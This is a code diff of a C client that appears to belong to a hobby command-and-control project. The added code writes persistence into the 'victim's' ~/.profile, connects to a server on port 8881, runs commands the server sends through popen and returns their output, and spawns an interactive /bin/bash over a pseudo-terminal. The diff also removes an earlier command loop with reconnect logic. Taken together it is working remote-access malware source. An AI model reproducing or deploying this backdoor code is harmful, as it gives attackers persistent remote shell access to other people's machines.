@@ -1,4 +1,3 @@
-#define _DEFAULT_SOURCE
 // Simple client architecture
 // Connects to host, reads message, disconnects
 #define _XOPEN_SOURCE 600
@@ -60,8 +59,65 @@ int persistence(char *get_path, FILE *fp)
   return 0;
 }
 
-pid_t bash_session(connection server_con)
+int main(void)
 {
+
+  // Get the .profile file path for the victim's machine
+  FILE *home_path = popen("echo $HOME/.profile", "r");
+  ;
+  char get_path[50];
+  fscanf(home_path, "%s", get_path);
+  pclose(home_path);
+
+  // Open .profile file in append mode
+  FILE *profile = fopen(get_path, "a+");
+  persistence(get_path, profile);
+
+  // LEAVE COMMENTED DURING DEV
+  signal(SIGINT, kill_handler);
+  connection server_con = connect_to("127.0.0.1", 8881);
+
+  // Check if the struct has been filled
+  if (server_con.dest_ip == NULL)
+  {
+    printf("[+] Could not connect to server.\n");
+    exit(-1);
+  }
+
+  printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
+
+  // Catch the hostname command and return it quickly
+  message data_recieved = recieve_data(server_con);
+  FILE *cmdptr;
+  cmdptr = popen(data_recieved.data, "r");
+
+  if (cmdptr == NULL)
+  {
+    // Oops, we couldn't open the pipe properly, notify the server
+    char *errmsg = "ERROR: Could not open pipe to shell";
+    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
+  }
+
+  // Read data from pipe character-by-character into buffer
+  char *buffer = malloc(10);
+  char character_read;
+  int length = 0;
+  while ((character_read = fgetc(cmdptr)) != EOF)
+  {
+    // Place our character from the pipe into the buffer
+    buffer[length] = character_read;
+    length++;
+
+    // Increase the buffer size if needed
+    if (length == strlen(buffer))
+    {
+      buffer = realloc(buffer, length + 10);
+    }
+  }
+
+  // Send the data and close the pipe
+  send(server_con.sock_fd, buffer, strlen(buffer), 0);
+  pclose(cmdptr);
 
   // Setting up a PTY session: http://rachid.koucha.free.fr/tech_corner/pty_pdip.html
   // Set up some file descriptors for interacting with the pty
@@ -102,10 +158,7 @@ pid_t bash_session(connection server_con)
 
   // Create the child process
   // The if statement returns true if we're the parent, and false if we're the child
-
-  int pid = fork();
-
-  if (pid != 0)
+  if (fork())
   {
     // We're the parent, we'll need to set up an array of(slave_fd to access the PTY
     fd_set forward_fds;
@@ -142,10 +195,6 @@ pid_t bash_session(connection server_con)
               // This low level stuff doesn't play nicely with "Send to all" packets from the server
               // So we will fall back on popen() -- TODO
 
-              // If exit is received from server, return pid of bash child process
-              if (strcmp(input, "exit") == 0) {
-                return pid;
-              }
               
               // Send data on the master side of PTY
               // Keep in mind that return_val now holds the length of the string to read
@@ -171,7 +220,6 @@ pid_t bash_session(connection server_con)
             else if (return_val < 0)
             {
               fprintf(stderr, "Error %d on read from bash\n", errno);
-              perror("Error: ");
               exit(1);
             }
           }
@@ -211,103 +259,14 @@ pid_t bash_session(connection server_con)
     setsid();
     ioctl(0, TIOCSCTTY, 1);
 
-<<<<<<< HEAD
-    // Execvp is a bit funky with args, so create an empty array
-=======
     // Execvp is a bit funky with args, so create an array with only bash in it
     // This took like 3 days to work out...
->>>>>>> 962e9733de22e9ea6ac632df2afd193ede5390fb
     char *args[] = {"/bin/bash", NULL};
     execvp(args[0], args);
 
     // In theory we shouldn't get to here, so something has gone horribly wrong...
     exit(1);
   }
-}
 
-void parse_single_command(message data_recieved, connection server_con)
-{
-    FILE *cmdptr;
-    cmdptr = popen(data_recieved.data, "r");
-
-    if (cmdptr == NULL)
-    {
-      // Oops, we couldn't open the pipe properly, notify the server
-      char *errmsg = "ERROR: Could not open pipe to shell";
-      send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
-    }
-
-    // Read data from pipe character-by-character into buffer
-    char *buffer = malloc(10);
-    char character_read;
-    int length = 0;
-    while ((character_read = fgetc(cmdptr)) != EOF)
-    {
-      // Place our character from the pipe into the buffer
-      buffer[length] = character_read;
-      length++;
-
-      // Increase the buffer size if needed
-      if (length == strlen(buffer))
-      {
-        buffer = realloc(buffer, length + 10);
-      }
-    }
-
-    // Send the data and close the pipe
-    send(server_con.sock_fd, buffer, strlen(buffer), 0);
-    pclose(cmdptr);
-}
-
-int main(void)
-{
-
-  // Get the .profile file path for the victim's machine
-  /*FILE *home_path = popen("echo $HOME/.profile", "r");
-  ;
-  char get_path[50];
-  fscanf(home_path, "%s", get_path);
-  pclose(home_path);
-
-  // Open .profile file in append mode
-  FILE *profile = fopen(get_path, "a+");
-  persistence(get_path, profile);*/
-
-  // LEAVE COMMENTED DURING DEV
-  //signal(SIGINT, kill_handler);
-  connection server_con = connect_to("127.0.0.1", 8881);
-
-  // Check if the struct has been filled
-  if (server_con.dest_ip == NULL)
-  {
-    printf("[+] Could not connect to server.\n");
-    exit(-1);
-  }
-
-  printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
-
-  // Catch the hostname command and return it quickly
-  while (1) {
-    message data_recieved = recieve_data(server_con);
-
-    // If server has dropped, close fd, sleep for 2 minutes and retry connection.
-    if (strcmp(data_recieved.data, "\000") == 0){
-      close(server_con.sock_fd);
-      printf("Server dropped. Sleeping.\n");
-      sleep(120);
-      connection server_con = connect_to("127.0.0.1", 8881);
-      printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
-    }
-
-    // If server sends message for 'bash' mode - call function
-    if (strcmp(data_recieved.data, "bash") == 0){
-      int pid = bash_session(server_con);
-      kill(pid, SIGKILL);
-    }
-    // Else, parse and return output for single command received
-    else {
-      parse_single_command(data_recieved, server_con);
-    }
-  }
   return 0;
 }
